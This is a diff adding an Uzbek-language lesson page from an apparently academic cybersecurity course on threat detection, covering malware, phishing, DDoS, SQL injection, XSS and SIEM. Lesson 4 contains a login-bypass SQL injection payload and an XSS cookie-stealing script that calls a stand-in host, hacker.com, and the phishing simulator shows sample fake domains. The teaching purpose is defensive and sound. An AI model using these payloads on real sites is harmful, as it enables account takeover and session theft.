@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="uz" data-theme="dark" data-module-id="threat-detection">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tahdidlarni Aniqlash — Modul 3 | Cyber Security Basics 2.0</title>
+    <meta name="description" content="Kiberhujumlar, Malware, Ransomware, Phishing, DDoS, SQL Injection va shubhali faollikni aniqlash bo'yicha to'liq amaliy qo'llanma.">
+    <link rel="icon" href="images/image.png" type="image/png">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="reading-progress-bar" id="readingProgressBar"></div>
+
+    <!-- Navigation -->
+    <header class="cyber-navbar">
+        <div class="container nav-inner">
+            <a href="index.html" class="nav-brand">
+                <span class="brand-icon">🛡️</span>
+                <span>CYBER <span class="text-gradient">SECURITY</span></span>
+                <span class="brand-badge">2.0</span>
+            </a>
+
+            <nav>
+                <ul class="nav-links" id="navLinks">
+                    <li><a href="index.html" class="nav-link">Bosh sahifa</a></li>
+                    <li><a href="index.html#modules" class="nav-link active">O‘quv modullari</a></li>
+                    <li><a href="threat-detection.html" class="nav-link active">Tahdidlar</a></li>
+                    <li><a href="protection.html" class="nav-link">Himoya</a></li>
+                    <li><a href="cyber-lab.html" class="nav-link">Cyber Lab</a></li>
+                    <li><a href="quiz.html" class="nav-link">Quiz</a></li>
+                    <li><a href="dashboard.html" class="nav-link">Natijalar</a></li>
+                    <li><a href="about.html" class="nav-link">Haqida</a></li>
+                </ul>
+            </nav>
+
+            <div class="nav-actions">
+                <button type="button" class="theme-toggle-btn" id="themeToggleBtn" aria-label="Mavzuni o'zgartirish">☀️</button>
+                <button type="button" class="hamburger-btn" id="hamburgerBtn" aria-label="Mobil menyu" aria-expanded="false">
+                    <span class="hamburger-line"></span>
+                    <span class="hamburger-line"></span>
+                    <span class="hamburger-line"></span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Module Header -->
+    <section class="module-header">
+        <div class="container">
+            <nav class="breadcrumb-nav">
+                <a href="index.html">Bosh sahifa</a>
+                <span class="breadcrumb-sep">/</span>
+                <a href="index.html#modules">Modullar</a>
+                <span class="breadcrumb-sep">/</span>
+                <span>Modul 3: Tahdidlarni Aniqlash</span>
+            </nav>
+
+            <div class="section-tag">Modul 3</div>
+            <h1>⚠️ Kiberxavfsizlik Tahdidlarini Aniqlash</h1>
+            <p style="font-size: 1.15rem; color: var(--text-secondary); max-width: 800px;">
+                Zamonaviy kiberhujum turlari: Malware, Ransomware tovlamachiligi, Phishing hiylalari, DDoS zarbalari, SQL Injection zaifliklari va ularni erta bosqichda taniy olish uslublari.
+            </p>
+
+            <div class="module-meta-bar">
+                <div class="module-meta-item"><span>📚</span> 5 ta chuqur dars</div>
+                <div class="module-meta-item"><span>⏱️</span> ~85 daqiqa dars vaqti</div>
+                <div class="module-meta-item"><span>🎣</span> Interaktiv Phishing Simulator</div>
+                <div class="module-meta-item"><span>🎯</span> Faqat himoya va tahlil maqsadida</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Module Layout -->
+    <main class="container module-layout">
+        <!-- Sidebar Navigation -->
+        <aside class="module-sidebar">
+            <div class="sidebar-title">
+                <span>Modul Darslari</span>
+                <span class="module-progress-text" id="moduleProgressText">0/5 (0%)</span>
+            </div>
+            <div class="module-progress-track">
+                <div class="module-progress-fill" id="moduleProgressFill" style="width: 0%;"></div>
+            </div>
+
+            <ul class="lesson-nav-list">
+                <li class="lesson-nav-item">
+                    <a href="#threat-1" class="lesson-nav-link active" data-lesson-id="threat-1">
+                        <span>1. Malware, Virus va Ransomware</span>
+                        <span class="lesson-check-icon">✓</span>
+                    </a>
+                </li>
+                <li class="lesson-nav-item">
+                    <a href="#threat-2" class="lesson-nav-link" data-lesson-id="threat-2">
+                        <span>2. Phishing va ijtimoiy muhandislik</span>
+                        <span class="lesson-check-icon">✓</span>
+                    </a>
+                </li>
+                <li class="lesson-nav-item">
+                    <a href="#threat-3" class="lesson-nav-link" data-lesson-id="threat-3">
+                        <span>3. DoS va DDoS hujumlari mexanizmi</span>
+                        <span class="lesson-check-icon">✓</span>
+                    </a>
+                </li>
+                <li class="lesson-nav-item">
+                    <a href="#threat-4" class="lesson-nav-link" data-lesson-id="threat-4">
+                        <span>4. SQL Injection va XSS asoslari</span>
+                        <span class="lesson-check-icon">✓</span>
+                    </a>
+                </li>
+                <li class="lesson-nav-item">
+                    <a href="#threat-5" class="lesson-nav-link" data-lesson-id="threat-5">
+                        <span>5. Shubhali faollikni aniqlash</span>
+                        <span class="lesson-check-icon">✓</span>
+                    </a>
+                </li>
+            </ul>
+
+            <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid var(--border-subtle);">
+                <a href="cyber-lab.html#lab-phishing" class="cyber-btn cyber-btn-outline cyber-btn-sm" style="width: 100%;">
+                    🧪 Phishing Challenge Lab →
+                </a>
+            </div>
+        </aside>
+
+        <!-- Lessons Content Area -->
+        <article class="lesson-content">
+            <!-- LESSON 1 -->
+            <section class="lesson-section active" id="threat-1">
+                <div class="lesson-header">
+                    <span class="lesson-number-badge">1-Dars • Zararli Dasturlar</span>
+                    <h2>Malware Turlari: Virus, Qurt (Worm), Troyan va Ransomware</h2>
+                </div>
+
+                <div class="lesson-body">
+                    <h3>🦠 Malware Nima?</h3>
+                    <p>
+                        <strong>Malware</strong> (inglizcha <em>"malicious software"</em> — zararli dasturiy ta'minot) — bu foydalanuvchining roziligisiz yoki xabarisiz uning kompyuteri, telefoni yoki tarmog'iga zarar yetkazish, josuslik qilish yoki boshqaruvni o'g'irlash uchun maxsus yozilgan har qanday dasturdir.
+                    </p>
+
+                    <div class="concept-grid">
+                        <div class="concept-card">
+                            <h4>1. Kompyuter Virusi</h4>
+                            <p>Mavjud qonuniy fayllarga (masalan: <code>.exe</code>, Word hujjatlari) o'z kodini qo'shib oladi. Foydalanuvchi faylni ishga tushirganidagina faollashadi va o'zini ko'paytiradi.</p>
+                        </div>
+                        <div class="concept-card">
+                            <h4>2. Tarmoq Qurti (Worm)</h4>
+                            <p>Virusdan farqli ravishda inson harakatini talab qilmaydi! Tarmoqdagi xatoliklar va ochiq portlar orqali bir kompyuterdan boshqasiga o'zi avtomatik tarzda sakrab o'tadi.</p>
+                        </div>
+                        <div class="concept-card">
+                            <h4>3. Troyan Oti (Trojan)</h4>
+                            <p>O'zini foydali dastur, o'yin yoki drayver sifatida ko'rsatadi. O'rnatilgach, orqa fonda xaker uchun maxfiy eshik (Backdoor / RAT) ochib beradi.</p>
+                        </div>
+                        <div class="concept-card">
+                            <h4>4. Ransomware (Tovlamachi)</h4>
+                            <p>Jabrlanuvchining hujjatlarini AES-256 bilan shifrlab, kalit uchun Bitcoin yoki boshqa kriptovalyutada katta pul talab qiladi (WannaCry, LockBit).</p>
+                        </div>
+                    </div>
+
+                    <h3>⚠️ Tizim Zararlanganining Aniq Belgilari</h3>
+                    <ul>
+                        <li>Kompyuter kutilmaganda haddan tashqari sekin ishlay boshladi, ventilyator tinmay to'liq quvvatda aylanmoqda.</li>
+                        <li>Fayllarning kengaytmasi o'zgarib qoldi (masalan: <code>hujjat.docx.locked</code>).</li>
+                        <li>Antivirus yoki Windows Defender o'z-o'zidan o'chib qoldi va uni qayta yoqib bo'lmayapti.</li>
+                        <li>Brauzerda soxta reklamalar va shubhali sahifalar ochilaveradi.</li>
+                    </ul>
+
+                    <div class="cyber-alert cyber-alert-danger">
+                        <div class="cyber-alert-icon">🛑</div>
+                        <div class="cyber-alert-content">
+                            <h4>Ransomware Tushganda Nima Qilish Kerak?</h4>
+                            <p>Zudlik bilan kompyuterni tarmoqdan (Wi-Fi va LAN kabelidan) uzing! Bu zararli dasturning boshqa ofis kompyuterlariga tarqalishini to'xtatadi. Hech qachon to'lov qilmang — to'lov kalit berilishini kafolatlamaydi!</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lesson-footer">
+                    <button type="button" class="mark-completed-btn"><span>✔️</span> Darsni tugatdim deb belgilash</button>
+                    <div class="lesson-pagination-btns">
+                        <button type="button" class="cyber-btn cyber-btn-primary" data-action="next-lesson">2-Darsga o'tish →</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- LESSON 2 -->
+            <section class="lesson-section" id="threat-2">
+                <div class="lesson-header">
+                    <span class="lesson-number-badge">2-Dars • Ijtimoiy Muhandislik</span>
+                    <h2>Phishing (Fishing) va Psixologik Manipulyatsiyalar</h2>
+                </div>
+
+                <div class="lesson-body">
+                    <h3>🎣 Phishing Qanday Ishlaydi?</h3>
+                    <p>
+                        Phishing — bu xakerning texnik zaifliklar o'rniga inson psixologiyasidagi zaifliklardan (qo'rquv, shoshilinchlik, ochko'zlik, qiziqish) foydalanib, uning login, parol yoki bank kartasi ma'lumotlarini aldab qo'lga kiritishidir.
+                    </p>
+
+                    <!-- Interactive Phishing Email Simulator -->
+                    <div class="interactive-simulator-box" id="phishing-demo">
+                        <div class="simulator-header">
+                            <h4>🔍 Interaktiv Laboratoriya: Soxta Xatdagi Xavfli Belgilarni Toping</h4>
+                            <span class="cyber-badge badge-orange" id="phishingFoundCount">0/5 Topildi</span>
+                        </div>
+                        <p style="font-size: 0.9rem; color: var(--text-secondary); margin-bottom: 1.25rem;">
+                            Quyidagi namunaviy elektron xatdagi shubhali joylarni (qizil nuqtalarni) bosing va xatoni aniqlang:
+                        </p>
+
+                        <div class="phishing-email-mockup">
+                            <div class="email-meta-header">
+                                <div style="font-size: 0.88rem; margin-bottom: 0.35rem;">
+                                    <strong>Kimdan:</strong> 
+                                    <span class="phishing-spot" data-explanation="Email manzili soxta domen! Rasmiy bank xati hech qachon 'support@payme-secure.cc' yoki notanish bepul domendan kelmaydi.">support@payme-secure.cc</span>
+                                </div>
+                                <div style="font-size: 0.88rem;">
+                                    <strong>Mavzu:</strong> 
+                                    <span class="phishing-spot" data-explanation="Shoshilinch qo'rquv uyg'otish — klassik fishing taktikasi. Maqsad foydalanuvchini o'ylab ko'rishga vaqt qoldirmasdan harakatga undash.">DIQQAT: Akkauntingiz 24 soat ichida to'xtatiladi!</span>
+                                </div>
+                            </div>
+                            <div class="email-body-content">
+                                <p>
+                                    <span class="phishing-spot" data-explanation="Umumiy salomlashuv. Rasmiy bank sizning ism-sharifingizni biladi, 'Hurmatli mijoz' deb yozmaydi.">Hurmatli foydalanuvchi!</span>
+                                </p>
+                                <p>
+                                    Tizimimizda xavfsizlik yangilanishi o'tkazilmoqda. Agar siz 
+                                    <span class="phishing-spot" data-explanation="Grammatik xatolar va soxta muddatlar. Kiberjinoyatchilar ko'pincha chet ellik bo'lib, avtomat tarjimadan foydalanadi.">bugun parolingizni tasdiqlamasangiz, hisobingiz abadiy bloklanadi.</span>
+                                </p>
+                                <p style="margin: 1.5rem 0;">
+                                    <span class="phishing-spot" data-explanation="Soxta havola! Tugma matni rasmiy ko'ringani bilan, uning asl URL manzili (http://payme-login-verification.xyz) butunlay soxta xakerlik serveriga olib boradi.">👉 [ SHU YERGA BOSIB PAROLINGIZNI KIRITING ]</span>
+                                </p>
+                                <p style="font-size: 0.85rem; color: var(--text-muted);">Hurmat bilan, Xavfsizlik Xizmati.</p>
+                            </div>
+                        </div>
+
+                        <div id="phishingDetailBox" class="cyber-alert cyber-alert-warning" style="display: none; margin-top: 1.25rem;"></div>
+                    </div>
+                </div>
+
+                <div class="lesson-footer">
+                    <button type="button" class="mark-completed-btn"><span>✔️</span> Darsni tugatdim deb belgilash</button>
+                    <div class="lesson-pagination-btns">
+                        <button type="button" class="cyber-btn cyber-btn-outline" data-action="prev-lesson">← 1-Dars</button>
+                        <button type="button" class="cyber-btn cyber-btn-primary" data-action="next-lesson">3-Darsga o'tish →</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- LESSON 3 -->
+            <section class="lesson-section" id="threat-3">
+                <div class="lesson-header">
+                    <span class="lesson-number-badge">3-Dars • Xizmatni To'xtatish</span>
+                    <h2>DoS va DDoS Hujumlari Mexanizmi</h2>
+                </div>
+
+                <div class="lesson-body">
+                    <h3>💥 DoS vs DDoS Farqi</h3>
+                    <p>
+                        <strong>DoS (Denial of Service):</strong> Bitta hujumchi kompyuter orqali serverga uning quvvatidan ortiq so'rovlar yuborib, tizimni qulashiga olib kelish.
+                    </p>
+                    <p>
+                        <strong>DDoS (Distributed Denial of Service):</strong> Dunyo bo'ylab tarqalgan yuz minglab zararlangan qurilmalar — <strong>Botnet</strong> (zombi kompyuterlar, smartfonlar va hatto zaif Wi-Fi kameralar) orqali bir vaqtning o'zida yagona nishonga trillionlab so'rovlar yo'llash.
+                    </p>
+
+                    <div class="concept-grid">
+                        <div class="concept-card">
+                            <h4>1. Volumetric Attacks (Hajmli hujumlar)</h4>
+                            <p>Tarmoq o'tkazuvchanlik kanalini to'ldirib tashlash (UDP flood, NTP amplification). Ma'lumot hajmi soniyasiga Terabitlarga yetishi mumkin.</p>
+                        </div>
+                        <div class="concept-card">
+                            <h4>2. Protocol Attacks (Protokol hujumlari)</h4>
+                            <p>Server yoki tarmoq qurilmalari (firewall, load balancer) resurslarini to'ldirish (TCP SYN Flood, Ping of Death).</p>
+                        </div>
+                        <div class="concept-card">
+                            <h4>3. Application Layer Attacks (Amaliy pog'ona)</h4>
+                            <p>Eng makkor hujum (HTTP Flood / Slowloris). Serverdagi og'ir qidiruv so'rovlarini to'xtovsiz chaqirib, ma'lumotlar bazasini qotirib qo'yish.</p>
+                        </div>
+                    </div>
+
+                    <div class="cyber-alert cyber-alert-info">
+                        <div class="cyber-alert-icon">🛡️</div>
+                        <div class="cyber-alert-content">
+                            <h4>DDoS dan Himoyalanish Usullari</h4>
+                            <p>Zamonaviy bizneslar DDoS ga qarshi Cloudflare, AWS Shield yoki maxsus Anycast CDN tarmoqlaridan foydalanadi. Ular hujum trafigini global serverlar bo'ylab tarqatib yuboradi va filtrlangan toza trafikni serverga o'tkazadi.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lesson-footer">
+                    <button type="button" class="mark-completed-btn"><span>✔️</span> Darsni tugatdim deb belgilash</button>
+                    <div class="lesson-pagination-btns">
+                        <button type="button" class="cyber-btn cyber-btn-outline" data-action="prev-lesson">← 2-Dars</button>
+                        <button type="button" class="cyber-btn cyber-btn-primary" data-action="next-lesson">4-Darsga o'tish →</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- LESSON 4 -->
+            <section class="lesson-section" id="threat-4">
+                <div class="lesson-header">
+                    <span class="lesson-number-badge">4-Dars • Veb Zaifliklar</span>
+                    <h2>SQL Injection va XSS (Cross-Site Scripting) Asoslari</h2>
+                </div>
+
+                <div class="lesson-body">
+                    <h3>💉 SQL Injection (SQLi) Qanday Sodir Bo'ladi?</h3>
+                    <p>
+                        SQL Injection veb-dasturchining xatosi tufayli yuzaga keladi: foydalanuvchi login formasiga kiritgan ma'lumot to'g'ridan-to'g'ri ma'lumotlar bazasi so'roviga qo'shib yuboriladi.
+                    </p>
+
+                    <div class="code-snippet-box">
+                        <div class="code-header">
+                            <span>Zaif Kod va Hujum Mexanizmi</span>
+                            <button type="button" class="copy-code-btn">Nusxa olish</button>
+                        </div>
+                        <pre>// Dasturchi yozgan zaif so'rov:
+SELECT * FROM users WHERE username = '$user_input' AND password = '$password_input';
+
+// Xaker username maydoniga quyidagini kiritadi:
+admin' OR '1'='1
+
+// Natijada serverda hosil bo'lgan buyruq:
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';
+// '1'='1' har doim ROST (true) bo'lgani sababli, xaker parolsiz tizimga kirib ketadi!</pre>
+                    </div>
+
+                    <h3>🛡️ To'g'ri Yechim: Parametrlashtirilgan So'rovlar (Prepared Statements)</h3>
+                    <p>
+                        Ma'lumotlar bazasi kiritilgan ma'lumotni hech qachon buyruq sifatida bajarmasligi, faqat oddiy matn sifatida qabul qilishi shart.
+                    </p>
+
+                    <h3>⚡ XSS (Cross-Site Scripting) Nima?</h3>
+                    <p>
+                        Xaker saytning izohlar bo'limiga zararli JavaScript kodini kiritadi (masalan: <code>&lt;script&gt;fetch('http://hacker.com?cookie=' + document.cookie)&lt;/script&gt;</code>). Boshqa har bir foydalanuvchi ushbu sahifani ochganda, uning brauzerida xakerning skripti ishga tushib, foydalanuvchi sessiya ma'lumotlarini o'g'irlaydi.
+                    </p>
+                </div>
+
+                <div class="lesson-footer">
+                    <button type="button" class="mark-completed-btn"><span>✔️</span> Darsni tugatdim deb belgilash</button>
+                    <div class="lesson-pagination-btns">
+                        <button type="button" class="cyber-btn cyber-btn-outline" data-action="prev-lesson">← 3-Dars</button>
+                        <button type="button" class="cyber-btn cyber-btn-primary" data-action="next-lesson">5-Darsga o'tish →</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- LESSON 5 -->
+            <section class="lesson-section" id="threat-5">
+                <div class="lesson-header">
+                    <span class="lesson-number-badge">5-Dars • Monitoring</span>
+                    <h2>Shubhali Faollikni Aniqlash va SIEM Tizimlari</h2>
+                </div>
+
+                <div class="lesson-body">
+                    <h3>👁️ SIEM (Security Information & Event Management)</h3>
+                    <p>
+                        Katta tashkilotlarda yuzlab serverlar, firewalllar va kompyuterlar mavjud. Har bir qurilma soniyasiga minglab log yozadi. 
+                        <strong>SIEM tizimlari (Splunk, Elastic SIEM, Microsoft Sentinel)</strong> barcha loglarni yagona markazga to'playdi va sun'iy intellekt orqali shubhali korrelyatsiyalarni aniqlaydi.
+                    </p>
+
+                    <div class="concept-grid">
+                        <div class="concept-card">
+                            <h4>IDS (Intrusion Detection System)</h4>
+                            <p>Tarmoq trafigini kuzatadi va kiberhujum belgilarini ko'rsa darhol administratorga ogohlantirish (alert) beradi.</p>
+                        </div>
+                        <div class="concept-card">
+                            <h4>IPS (Intrusion Prevention System)</h4>
+                            <p>Nafaqat aniqlaydi, balki hujum kelayotgan manba IP manzilini darhol avtomatik bloklab, paketlarni to'xtatadi.</p>
+                        </div>
+                    </div>
+
+                    <div class="cyber-alert cyber-alert-success">
+                        <div class="cyber-alert-icon">✅</div>
+                        <div class="cyber-alert-content">
+                            <h4>Modul Xulosasi</h4>
+                            <p>Kiberhujumlarni oldindan aniqlash — muvaffaqiyatli himoyaning 90 foizidir. Tizim loglarini muntazam tahlil qilish va ijtimoiy muhandislik belgilarini taniy olish orqali xatarlar bartaraf etiladi.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lesson-footer">
+                    <button type="button" class="mark-completed-btn"><span>✔️</span> Darsni tugatdim deb belgilash</button>
+                    <div class="lesson-pagination-btns">
+                        <button type="button" class="cyber-btn cyber-btn-outline" data-action="prev-lesson">← 4-Dars</button>
+                        <a href="protection.html" class="cyber-btn cyber-btn-primary">Keyingi Modul: Himoya Usullari →</a>
+                    </div>
+                </div>
+            </section>
+        </article>
+    </main>
+
+    <!-- Footer -->
+    <footer class="cyber-footer">
+        <div class="container">
+            <div class="footer-bottom">
+                <div>&copy; 2026 Cyber Security Basics. All rights reserved. University of Geological Sciences</div>
+                <button type="button" class="back-to-top-btn" id="backToTopBtn">Yuqoriga ⬆️</button>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="data/lessons-data.js"></script>
+    <script src="data/questions.js"></script>
+    <script src="js/storage.js"></script>
+    <script src="js/navigation.js"></script>
+    <script src="js/animations.js"></script>
+    <script src="js/lessons.js"></script>
+    <script src="js/labs.js"></script>
+    <script src="js/main.js"></script>
+</body>
+</html>
